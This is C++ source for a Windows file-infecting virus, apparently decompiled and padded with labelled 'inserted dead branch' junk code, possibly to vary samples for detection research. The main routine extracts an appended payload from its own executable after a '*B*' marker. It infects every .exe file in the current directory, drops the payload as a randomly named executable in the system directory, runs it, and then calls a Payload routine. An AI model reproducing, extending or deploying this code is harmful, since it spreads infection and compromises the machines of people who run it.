#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>          // for ShellExecuteA
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <stdio.h>

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HMODULE hModule = GetModuleHandleA(nullptr);
    GetModuleFileNameA(hModule, Virus, 0x104);
    Secret(Virus);

    inf = 0x2a;
    DAT_140008165 = 0x42;
    DAT_140008166 = 0x2a;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // Category A: System info queries
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        volatile DWORD pageSize = si.dwPageSize;
        volatile DWORD allocGran = si.dwAllocationGranularity;
        volatile DWORD numProcs = si.dwNumberOfProcessors;

        SYSTEMTIME st;
        GetLocalTime(&st);
        volatile WORD year = st.wYear;
        volatile WORD month = st.wMonth;
        volatile WORD day = st.wDay;

        CHAR userName[256];
        DWORD userNameLen = 256;
        GetUserNameA(userName, &userNameLen);
        volatile char firstChar = userName[0];

        CHAR compName[256];
        DWORD compNameLen = 256;
        GetComputerNameA(compName, &compNameLen);
        volatile DWORD nameHash = 0;
        for (int i = 0; compName[i] != '\0'; ++i) {
            nameHash ^= (compName[i] << (i % 8));
        }
        volatile DWORD dummyResult = (pageSize ^ allocGran) + numProcs + year + month + day + nameHash;
        (void)dummyResult;
        SecureZeroMemory(userName, sizeof(userName));
        SecureZeroMemory(compName, sizeof(compName));
    }

    std::ifstream inFile(Virus, std::ios::in | std::ios::binary);
    inFile.seekg(0, std::ios::end);
    std::streampos pos = inFile.tellg();
    int fileSize = static_cast<int>(pos);
    inFile.seekg(0, std::ios::beg);

    VBuffer = static_cast<char*>(malloc(static_cast<size_t>(fileSize)));
    inFile.read(VBuffer, fileSize);
    inFile.close();

    int markerPos = -1;
    for (int i = 0; i < fileSize; ++i) {
        if (VBuffer[i] == '*' && VBuffer[i + 1] == 'B' && VBuffer[i + 2] == '*') {
            markerPos = i;
            FBuffer = VBuffer + i + 3;
            break;
        }
    }

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        // Category B: Memory & String operations
        char localBuf[128];
        volatile char dummyBuf[64];
        memset((void*)dummyBuf, 0xAA, sizeof(dummyBuf));
        for (int i = 0; i < 5; ++i) {
            dummyBuf[i] = (char)(i + 0x10);
        }
        char* heapBuf = (char*)malloc(128);
        if (heapBuf != nullptr) {
            memcpy(heapBuf, "DEAD_BRANCH_TEST", 17);
            size_t len = strlen(heapBuf);
            volatile size_t vLen = len;
            char tempBuf[64];
            sprintf_s(tempBuf, sizeof(tempBuf), "Len=%zu, Tick=%lu", vLen, dummy_tick_2);
            volatile char firstByte = tempBuf[0];
            (void)firstByte;
            for (int j = 0; j < 3; ++j) {
                heapBuf[j] = (char)(heapBuf[j] ^ 0x55);
            }
            free(heapBuf);
        }
        volatile unsigned long hashVal = 0x811C9DC5;
        for (int i = 0; i < 16; ++i) {
            hashVal ^= (unsigned char)dummyBuf[i];
            for (int bit = 0; bit < 8; ++bit) {
                if (hashVal & 0x80000000) {
                    hashVal = (hashVal << 1) ^ 0x01000193;
                } else {
                    hashVal <<= 1;
                }
            }
        }
        (void)hashVal;
        SecureZeroMemory(localBuf, sizeof(localBuf));
        SecureZeroMemory((void*)dummyBuf, sizeof(dummyBuf));
    }

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("*.exe", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            Infect(findData.cFileName, VBuffer);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    time_t t = time(nullptr);
    srand(static_cast<unsigned int>(t));
    int randNum = rand();
    char* randStr = itoa(randNum, buff, 10);

    CHAR systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat(systemPath, "\\drivers");
    strcat(systemPath, randStr);
    strcat(systemPath, ".exe");

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Category C: Bitwise/Math loops
        volatile unsigned long dummyArray[32];
        for (int i = 0; i < 32; ++i) {
            dummyArray[i] = (unsigned long)(i * 0x9E3779B9);
        }
        volatile unsigned long xorAccum = 0;
        for (int i = 0; i < 32; ++i) {
            xorAccum ^= dummyArray[i];
            for (int j = 0; j < 4; ++j) {
                xorAccum = (xorAccum << 5) | (xorAccum >> 27);
                xorAccum ^= 0x12345678;
            }
        }
        volatile unsigned long fnvHash = 0x811C9DC5;
        for (int i = 0; i < 32; ++i) {
            fnvHash ^= (unsigned char)(dummyArray[i] & 0xFF);
            fnvHash *= 0x01000193;
            fnvHash ^= (unsigned char)((dummyArray[i] >> 8) & 0xFF);
            fnvHash *= 0x01000193;
            fnvHash ^= (unsigned char)((dummyArray[i] >> 16) & 0xFF);
            fnvHash *= 0x01000193;
            fnvHash ^= (unsigned char)((dummyArray[i] >> 24) & 0xFF);
            fnvHash *= 0x01000193;
        }
        volatile unsigned long polyHash = 0;
        for (int i = 0; i < 32; ++i) {
            polyHash = (polyHash * 0x41C64E6D) + dummyArray[i];
        }
        volatile unsigned long finalDummy = (xorAccum ^ fnvHash) + polyHash;
        (void)finalDummy;
        SecureZeroMemory((void*)dummyArray, sizeof(dummyArray));
    }

    if (FBuffer != nullptr) {
        std::ofstream outFile(systemPath, std::ios::out | std::ios::binary);
        if (markerPos != -1) {
            int payloadSize = fileSize - (markerPos + 3);
            outFile.write(FBuffer, payloadSize);
        }
        outFile.close();
        ShellExecuteA(nullptr, nullptr, systemPath, nullptr, nullptr, 5);
    }

    Payload();
    return 0;
}